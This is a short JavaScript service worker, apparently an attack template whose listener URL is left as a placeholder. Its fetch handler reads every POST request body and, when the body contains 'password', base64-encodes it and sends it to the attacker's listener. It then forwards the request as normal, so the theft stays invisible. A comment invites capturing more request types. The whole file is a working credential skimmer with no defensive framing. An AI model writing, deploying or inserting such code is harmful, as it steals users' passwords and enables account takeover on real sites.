var listenerUrl = '%%LISTENER%%';

self.addEventListener('install', function(event) {
  console.debug("install");
});

self.addEventListener('activate', function(event) {
  console.debug("activate");
});

self.addEventListener('fetch', event => {
  event.respondWith(async function() {
    var clone = event.request.clone();

    // Rewrite this if you want to capture other requests
    if (event.request.method === 'POST') {
      clone.text().then(function(t) {
        if (t.includes("password")) {
          fetch(listenerUrl + "/b64/" + btoa(t));
        }
      });
    }

    return fetch(event.request);
  }());
});
